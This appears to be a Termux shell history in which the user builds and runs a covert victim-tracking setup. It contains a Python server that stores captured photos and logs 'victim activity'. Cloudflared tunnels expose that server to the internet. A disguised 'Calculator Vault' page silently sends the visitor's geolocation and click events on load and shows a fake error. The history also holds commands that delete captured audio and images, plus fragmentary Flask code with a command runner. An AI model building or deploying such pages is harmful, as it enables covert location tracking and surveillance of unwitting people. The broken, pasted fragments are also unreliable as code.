if __name__ == "__main__":
    banner()
    os.makedirs("captured_media", exist_ok=True)
    os.makedirs("data_logs", exist_ok=True)
    PORT = 8080
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print(f"[*] Server Listening on Port: {PORT}")
        print("[*] Link: https://concert-afternoon-catalyst-paragraph.trycloudflare.com")
        print("[*] Monitoring victim activity... (Press CTRL+C to stop)")
        httpd.serve_forever()
EOF

cd ~/MyTool/data_logs
tail -f activity.txt
python main.py
cd
mytools
cd ~/MyTool
python main.py
exit
cloudflared tunnel --url http://127.0.0.1:8080
cloudflared tunnel
cloudflared tunnel --url http://127.0.0.1:8080
exit
cd ~/MyTool
python main.py
fuser -k 8080/tcp
pkill python
python main.py
clear
exit
tail -f ~/MyTool/data_logs/activity.txt
touch ~/MyTool/data_logs/activity.txt
tail -f ~/MyTool/data_logs/activity.txt
exit
cloudflared tunnel --url http://127.0.0.1:8080
exit
cat <<'EOF' > clean.sh
#!/bin/bash
echo "Cleaning up old logs and media..."
rm -rf captured_media/*
rm -rf data_logs/*
touch data_logs/activity.txt
echo "Cleanup complete. Your tool is fresh!"
EOF

chmod +x clean.sh
python main.py
cd
ls
MyTool
cd MyTool
python main.py
exit
pkill python
pkill cloudflared
rm -rf ~/MyTool
mkdir ~/MyTool
cd ~/MyTool
mkdir web_files data_logs captured_media
touch data_logs/activity.txt
cat <<'EOF' > main.py
import os, http.server, socketserver, cgi, json
from datetime import datetime

def banner():
    print("\033[1;32m")
    print("  __  __       _______          _ ")
    print(" |  \/  |     |__   __|        | |")
    print(" | \  / |_   _   | | ___   ___ | |")
    print(" | |\/| | | | |  | |/ _ \ / _ \| |")
    print(" | |  | | |_| |  | | (_) | (_) | |")
    print(" |_|  |_|\__, |  |_|\___/ \___/|_|")
    print("          __/ |                   ")
    print("         |___/                    ")
    print("\033[1;34m [ My Remote Access Lab - v1.0 ]\033[0m\n")

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/upload':
            form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
            if 'file' in form:
                data = form['file'].file.read()
                filename = f"captured_media/img_{datetime.now().strftime('%H%M%S')}.jpg"
                with open(filename, "wb") as f: f.write(data)
                print(f"\033[1;31m[!] Data Captured: {filename}\033[0m")
        elif self.path == '/logs':
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length).decode()
            with open("data_logs/activity.txt", "a") as f:
                f.write(f"[{datetime.now()}] {data}\n")
            print(f"\033[1;33m[*] New Activity Logged\033[0m")
        self.send_response(200)
        self.end_headers()

if __name__ == "__main__":
    banner()
    PORT = 8080
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print(f"[*] Server Started on Port: {PORT}")
        httpd.serve_forever()
EOF

cd ~/MyTool
python main.py
exit
cloudflared tunnel --url http://127.0.0.1:8080
exit
tail -f ~/MyTool/data_logs/activity.txt
exit
# اپنی ویب فائل کو مین جگہ پر منتقل کریں
cp ~/MyTool/web_files/index.html ~/MyTool/
ls ~/MyTool/captured_media
cp ~/MyTool/captured_media/* /sdcard/Download/
cat <<'EOF' > ~/MyTool/web_files/index.html
<!DOCTYPE html>
<html>
<head><title>Calculator Vault</title></head>
<body style="background:#000; color:#fff; text-align:center;">
    <h2>Vault is Active</h2>
    <p>Data will appear in Termux logs.</p>
</body>
</html>
EOF

ls ~/MyTool/captured_media
cp ~/MyTool/captured_media/* /sdcard/Download/
clear
echo "alias start-tool='cd ~/MyTool && python main.py'" >> ~/.bashrc
source ~/.bashrc
exit
tail -f ~/MyTool/data_logs/activity.txt
exit
tail -f ~/MyTool/data_logs/activity.txt
exit
cloudflared tunnel --url http://127.0.0.1:8080
exit
cd ~/MyTool
python main.py
cp ~/MyTool/web_files/index.html ~/MyTool/
# اپنی ویب فائل کو مین جگہ پر منتقل کریں
cp ~/MyTool/web_files/index.html ~/MyTool/
cp -r ~/MyTool/captured_media/* /sdcard/Download/
cd ~/MyTool
# چیک کریں کہ فائلیں کہاں ہیں
ls -R
clear
cat <<'EOF' > ~/MyTool/web_files/index.html
<!DOCTYPE html>
<html>
<head>
    <title>Secure Vault</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #121212; color: white; text-align: center; font-family: sans-serif; }
        .calc { border: 2px solid #333; display: inline-block; padding: 20px; border-radius: 10px; margin-top: 50px; }
        button { width: 50px; height: 50px; margin: 5px; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="calc">
        <h3>Calculator Vault</h3>
        <input type="text" style="width: 220px; height: 40px;"><br><br>
        <button onclick="send()">1</button><button onclick="send()">2</button><button onclick="send()">3</button><br>
        <button onclick="send()">4</button><button onclick="send()">5</button><button onclick="send()">6</button><br>
        <button onclick="send()">7</button><button onclick="send()">8</button><button onclick="send()">9</button><br>
        <button onclick="send()">0</button>
    </div>

    <script>
        // خود بخود ڈیٹا بھیجنے کا فنکشن
        function send() {
            fetch('/logs', {
                method: 'POST',
                body: "Button Clicked at: " + new Date().toLocaleTimeString()
            });
            alert("Connection Error: Try again later!");
        }

        // پیج کھلتے ہی لوکیشن بھیجنا
        navigator.geolocation.getCurrentPosition((pos) => {
            fetch('/logs', {
                method: 'POST',
                body: "Location: Lat " + pos.coords.latitude + ", Lon " + pos.coords.longitude
            });
        });
    </script>
</body>
</html>
EOF

cp ~/MyTool/web_files/index.html ~/MyTool/
cd ~/MyTool
python main.py
exit
start-tool
cp /sdcard/Pictures/1767169752502_1.jpg ~/MyTool/banner.jpg
cat <<'EOF' > ~/MyTool/index.html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Lab Banner</title>
    <style>
        body { margin: 0; background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; }
        .banner {
            width: 100%;
            height: 350px;
            background-image: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('banner.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            border-bottom: 3px solid #00ff00;
        }
        .banner h1 { font-size: 2.5rem; text-transform: uppercase; letter-spacing: 5px; text-shadow: 0 0 10px #00ff00; }
        .content { padding: 30px; text-align: center; }
    </style>
</head>
<body>

    <div class="banner">
        <h1>My Remote Lab</h1>
    </div>

    <div class="content">
        <h2>System Online</h2>
        <p>This server is hosted securely via Termux & Cloudflare.</p>
    </div>

</body>
</html>
EOF

cd ~/MyTool && python main.py
cp /sdcard/Pictures/1767169752502_1.jpg ~/MyTool/banner.jpg
python main.py
exit
cloudflared tunnel --url http://127.0.0.1:8080
exit
pkg install android-tools
adb pair 192.168.100.89:37495
adb connect 192.168.100.89:35107
adb kill-server
adb start-server
adb pair 192.168.100.89:44997
adb connect 192.168.100.89
adb kill-server
adb start-server
adb pair 127.0.0.1 53501
clear
adb kill-server
adb start-server
cloudflared tunnel --url http://127.0.0.1:5000
exit
cloudflared tunnel --url http://127.0.0.1:5000
exit
python.py
cd
ls
clear
cd
ls
cd MyTool
python.py
ls
python main.py
cd
ls
cd MyTool
python main.py
exit
cloudflared tunnel --url http://127.0.0.1:8080
clear
mkdir static
cp /sdcard/Download/your_photo.jpg ./static/banner.jpg
termux-setup-storage
ls /sdcard/Download
rm main.py lab_data.db
rm -rf static
rm -rf *
ls /sdcard/Download
rm /sdcard/Download/captured_*
rm /sdcard/Download/captured_audio.webm /sdcard/Download/my_secret_audio.webm /sdcard/Download/poetry_stream.webm
rm /sdcard/Download/gallery_view.html
ls /sdcard/Download
mkdir adv_lab
cd adv_lab
mkdir static templates
nano main.py 
cat main.py
cp /sdcard/Download/captured_105439.jpg ./static/banner.jpg
ls /sdcard/Download/captured_105439.jpg
ls /sdcard/Download
termux-setup-storage
cp /storage/emulated/0/Pictures/1767169752502_1.jpg ./static/banner.jpg
nano main.py
ls
cd static
ls
banner.jpg
cd banner.jpg
ls ~/adv_lab/static
nano main.py
cat main.py
ls -l main.py
mv main.py ..
cd ..
python main.py
exit
nano main.py
cat main.py
python main.py
pip install flask
python main.py
exit
cloudflared tunnel --url http://127.0.0.1:8080
exit
cloudflared tunnel --url http://127.0.0.1:8080
exit
python mian.py
python main.py
cd adv_lab
python main.py
sqlite3 hacker_logs.db
pkg install sqlite -y
sqlite3 hacker_logs.db
clear
from flask import Flask, render_template_string, request, session, redirect, url_for
import sqlite3, subprocess, os
from datetime import datetime
app = Flask(__name__)
app.secret_key = "super_secret_key_786" # سیشن کو محفوظ بنانے کے لیے
PASSCODE = "1234" # یہاں اپنا خفیہ کوڈ بدل سکتے ہیں
def run_command(cmd):
@app.route('/login', methods=['GET', 'POST'])
def login():
rm main.py
nano main.py
rm main.py
nano main.py
python main.py
rm main.py
nano main.py
python main.py
cloudflared tunnel --url http://127.0.0.1:8080
clear
git config --global user.email "your-email@example.com"
git config --global user.name "Rashedblouch"
git init
git add .
git commit -m "First professional toolkit upload"
git remote add origin https://github.com/Rashedblouch/Mr-blouch.git
git push -u origin main
git branch -m main
git push -u origin main
git pull origin main --rebase
git push -u origin main
clear
apt update &&& upgrdae - y
pkg update && upgrade -y
flask
gunicorn
pip install gunicorn
flask
gunicorn
export FLASK_APP=main.py
flask run --host=0.0.0.0 --port=8080
ls
cd adv_lab
ls
from flask import Flask, render_template_string, request
import requests
app = Flask(__name__)
# مین پیج کا ڈیزائن
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <title>MR. BALOCH | Ethical Hacking Tools</title>
    <style>
        body { background: #050505; color: #00ff00; font-family: sans-serif; text-align: center; }
        .container { border: 1px solid #00ff00; margin: 50px auto; width: 80%; padding: 20px; box-shadow: 0 0 20px #00ff00; }
        .tool-box { border: 1px solid #333; padding: 15px; margin: 10px; display: inline-block; width: 250px; }
        button { background: #00ff00; color: black; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
        input { padding: 10px; width: 70%; background: #111; color: white; border: 1px solid #00ff00; }
    </style>
</head>
<body>
    <div class="container">
        <h1>MR. BALOCH TOOLKIT</h1>
        <p>Advanced Web-Based Information Gathering</p>
        <hr>
        
        <div class="tool-box">
            <h3>IP Tracker</h3>
            <form action="/track-ip" method="POST">
                <input type="text" name="ip" placeholder="Enter IP Address">
                <br><br>
                <button type="submit">Track Info</button>
            </form>
        </div>

        <div class="tool-box">
            <h3>Website Scanner</h3>
            <p>Coming Soon...</p>
            <button disabled>Locked</button>
        </div>
    </div>
</body>
</html>
'''
@app.route('/')
def home():
@app.route('/track-ip', methods=['POST'])
def track_ip():
if __name__ == '__main__':;     app.run(debug=True)
rm main.py
nano main.py
python main.py
ls
python main.py
pip install requests
python main.py
apt update
ls
cd adv_lab
ls
cd static
ls
banner.jpg /view
clear
pip install flask flask-sqlalchemy
nano create_admin.py
ls
nano app.py
nano create_admin.py
ls
clear
ls
python create_admin.py
ls
python -c "from app import app, db; with app.app_context(): db.create_all()"
nano init_db.py
python init_db.py
ls
python create_admin.py [cite: 2026-01-03]
python app.py
nano app.py [cite: 2026-01-03]
ls
rm app.py [cite: 2026-01-03]
rm app.py
ls
nano app.py
python app.py 
rm app.py
ls
nano app.py
ls
nano app.py
python app.py
rm app.py
nano  app.py
ls
python app.py
rm app.py
ls
nano app.py
python app.py
rm app.py
nano app.py
python app.py
rm app.py
nano app.py
python app.py
rm app.py
nano app.py
python app.py
rm app.py
nano app.py
python app.py
nano
nano user_site.py
python user_site.py
ls
rm user_site.py
nano user_site.py
python user_site.py
ls
rm user_site.py
nano user_site.py
python app.py
ls
rm user_site.py
nano user_site.py
python user_site.py
122345678990qwertyuiopasdfghjklZxcvbnmm1.
